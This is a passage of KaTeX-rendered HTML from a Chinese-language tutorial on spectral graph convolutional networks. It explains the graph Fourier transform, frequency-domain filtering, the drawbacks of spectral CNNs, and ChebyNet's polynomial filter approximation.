accent=\"true\"><mi>x</mi><mo>^</mo></mover><mrow><mi>k</mi><mo separator=\"true\">,</mo><mi>i</mi></mrow></msub><mo>=</mo><msup><mi>U</mi><mi>T</mi></msup><msub><mi>x</mi><mrow><mi>k</mi><mo separator=\"true\">,</mo><mi>i</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">\\hat{x}_{k,i}=U^Tx_{k,i}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.980548em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.69444em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span></span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.22222em;\"><span class=\"mord\">^</span></span></span></span></span></span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.177439em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913309999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span></span></p>\n</li>\n<li>\n<p>频域卷积：对转换后的信号逐点乘积：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msub><mover accent=\"true\"><mi>y</mi><mo>^</mo></mover><mrow><mi>k</mi><mo separator=\"true\">,</mo><mi>i</mi><mo separator=\"true\">,</mo><mi>j</mi></mrow></msub><mo>=</mo><msub><mi>F</mi><mrow><mi>k</mi><mo separator=\"true\">,</mo><mi>i</mi><mo separator=\"true\">,</mo><mi>j</mi></mrow></msub><msub><mover accent=\"true\"><mi>x</mi><mo>^</mo></mover><mrow><mi>k</mi><mo separator=\"true\">,</mo><mi>i</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">\\hat{y}_{k,i,j}=F_{k,i,j}\\hat{x}_{k,i}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.980548em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord accent\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.69444em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.19444em;\"><span class=\"mord\">^</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.19444em;\"><span></span></span></span></span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\">i</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.980548em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\">i</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.69444em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span></span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.22222em;\"><span class=\"mord\">^</span></span></span></span></span></span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span></span></p>\n</li>\n<li>\n<p>逆图傅里叶变换：将频域结果转换回时域：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msub><mi>y</mi><mrow><mi>k</mi><mo separator=\"true\">,</mo><mi>i</mi><mo separator=\"true\">,</mo><mi>j</mi></mrow></msub><mo>=</mo><mi>U</mi><msub><mover accent=\"true\"><mi>y</mi><mo>^</mo></mover><mrow><mi>k</mi><mo separator=\"true\">,</mo><mi>i</mi><mo separator=\"true\">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">y_{k,i,j}=U\\hat{y}_{k,i,j}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.716668em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\">i</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.980548em;vertical-align:-0.286108em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"mord\"><span class=\"mord accent\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.69444em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.19444em;\"><span class=\"mord\">^</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.19444em;\"><span></span></span></span></span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\">i</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span></span></p>\n</li>\n<li>\n<p>信号叠加和激活函数：将所有滤波结果相加，并通过激活函数得到第<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>k</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">k+1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.77777em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span></span></span></span> 层的输出信号</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msub><mi>x</mi><mrow><mi>k</mi><mo>+</mo><mn>1</mn><mo separator=\"true\">,</mo><mi>j</mi></mrow></msub><mo>=</mo><mi>h</mi><mrow><mo fence=\"true\">(</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><msub><mi>f</mi><mi>k</mi></msub></munderover><msub><mi>y</mi><mrow><mi>k</mi><mo separator=\"true\">,</mo><mi>i</mi><mo separator=\"true\">,</mo><mi>j</mi></mrow></msub><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">x_{k+1,j}=h\\left(\\sum_{i=1}^{f_k}y_{k,i,j}\\right)\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.716668em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span><span class=\"mbin mtight\">+</span><span class=\"mord mtight\">1</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:3.16089em;vertical-align:-1.277669em;\"></span><span class=\"mord mathnormal\">h</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size4\">(</span></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.8832210000000003em;\"><span style=\"top:-1.872331em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">1</span></span></span></span><span style=\"top:-3.050005em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span><span style=\"top:-4.347113em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10764em;\">f</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.3487714285714287em;margin-left:-0.10764em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15122857142857138em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.277669em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\">i</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size4\">)</span></span></span></span></span></span></span></p>\n</li>\n</ul>\n<h2 id=\"cnn的缺点\"><a class=\"anchor\" href=\"#cnn的缺点\">#</a> CNN 的缺点</h2>\n<ul>\n<li>需要拉普拉斯矩阵的特征分解（Requiring Eigen-Decomposition of Laplacian Matrix）</li>\n<li>高计算成本（High Computational Cost）</li>\n<li>在顶点域中不具备局部化特性（Not Localized in Vertex Domain）</li>\n</ul>\n<h2 id=\"chebynet通过多项式近似参数化滤波器\"><a class=\"anchor\" href=\"#chebynet通过多项式近似参数化滤波器\">#</a> ChebyNet：通过多项式近似参数化滤波器</h2>\n<p><strong>Parameterizing Filter via Polynomial Approximation</strong></p>\n<p>ChebyNet 是一种改进的光谱图卷积神经网络方法，通过多项式近似来参数化卷积滤波器，从而提高计算效率并减少参数数量。以下是对 ChebyNet 方法的详细解释：</p>\n<h4 id=\"背景\"><a class=\"anchor\" href=\"#背景\">#</a> 背景</h4>\n<p>在传统的光谱图卷积神经网络中，卷积滤波器需要显式地使用拉普拉斯矩阵的特征分解，这导致高计算成本和参数量。ChebyNet 通过多项式近似的方法来简化这一过程。</p>\n<h4 id=\"多项式近似\"><a class=\"anchor\" href=\"#多项式近似\">#</a> 多项式近似</h4>\n<p>ChebyNet 使用 Chebyshev 多项式来近似卷积滤波器。具体来说，卷积滤波器 $ g_\\theta<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mtext>被表示为拉普拉斯矩阵特征值</mtext></mrow><annotation encoding=\"application/x-tex\">被表示为拉普拉斯矩阵特征值</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord cjk_fallback\">被</span><span class=\"mord cjk_fallback\">表</span><span class=\"mord cjk_fallback\">示</span><span class=\"mord cjk_fallback\">为</span><span class=\"mord cjk_fallback\">拉</span><span class=\"mord cjk_fallback\">普</span><span class=\"mord cjk_fallback\">拉</span><span class=\"mord cjk_fallback\">斯</span><span class=\"mord cjk_fallback\">矩</span><span class=\"mord cjk_fallback\">阵</span><span class=\"mord cjk_fallback\">特</span><span class=\"mord cjk_fallback\">征</span><span class=\"mord cjk_fallback\">值</span></span></span></span> \\Lambda$ 的一个多项式：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msub><mi>g</mi><mi>β</mi></msub><mo stretchy=\"false\">(</mo><mi mathvariant=\"normal\">Λ</mi><mo stretchy=\"false\">)</mo><mo>=</mo><munderover><mo>∑</mo><mrow><mi>k</mi><mo>=</mo><mn>0</mn></mrow><mrow><mi>K</mi><mo>−</mo><mn>1</mn></mrow></munderover><msub><mi>β</mi><mi>k</mi></msub><msup><mi mathvariant=\"normal\">Λ</mi><mi>k</mi></msup></mrow><annotation encoding=\"application/x-tex\">g_\\beta(\\Lambda)=\\sum_{k=0}^{K-1}\\beta_k\\Lambda^k\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.036108em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05278em;\">β</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord\">Λ</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:3.1304490000000005em;vertical-align:-1.302113em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.8283360000000002em;\"><span style=\"top:-1.8478869999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">0</span></span></span></span><span style=\"top:-3.0500049999999996em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span><span style=\"top:-4.300005em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07153em;\">K</span><span class=\"mbin mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.302113em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.05278em;\">β</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord\">Λ</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8991079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span></span></span></span></span></span></span></span></span></span></span></span></p>\n<ul>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>β</mi><mi>k</mi></msub></mrow><annotation encoding=\"application/x-tex\">\\beta_k</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.05278em;\">β</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 是多项式的系数，是需要学习的参数</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"normal\">Λ</mi></mrow><annotation encoding=\"application/x-tex\">\\Lambda</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">Λ</span></span></span></span> 是拉普拉斯矩阵的特征值对角矩阵</li>\n</ul>\n<h4 id=\"chebynet-的卷积操作\"><a class=\"anchor\" href=\"#chebynet-的卷积操作\">#</a> ChebyNet 的卷积操作</h4>\n<p>通过多项式近似，ChebyNet 中的图卷积操作可以写成：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>x</mi><msub><mo>∗</mo><mi>G</mi></msub><mi>y</mi><mo>=</mo><mi>U</mi><msub><mi>g</mi><mi>β</mi></msub><mo stretchy=\"false\">(</mo><mi mathvariant=\"normal\">Λ</mi><mo stretchy=\"false\">)</mo><msup><mi>U</mi><mi>T</mi></msup><mi>x</mi><mo>=</mo><munderover><mo>∑</mo><mrow><mi>k</mi><mo>=</mo><mn>0</mn></mrow><mrow><mi>K</mi><mo>−</mo><mn>1</mn></mrow></munderover><msub><mi>β</mi><mi>k</mi></msub><msup><mi>L</mi><mi>k</mi></msup><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x*_Gy=Ug_\\beta(\\Lambda)U^Tx=\\sum_{k=0}^{K-1}\\beta_kL^kx\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.61528em;vertical-align:-0.15em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\"><span class=\"mbin\">∗</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">G</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.177439em;vertical-align:-0.286108em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05278em;\">β</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord\">Λ</span><span class=\"mclose\">)</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913309999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span></span></span></span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:3.1304490000000005em;vertical-align:-1.302113em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.8283360000000002em;\"><span style=\"top:-1.8478869999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">0</span></span></span></span><span style=\"top:-3.0500049999999996em;\"><span 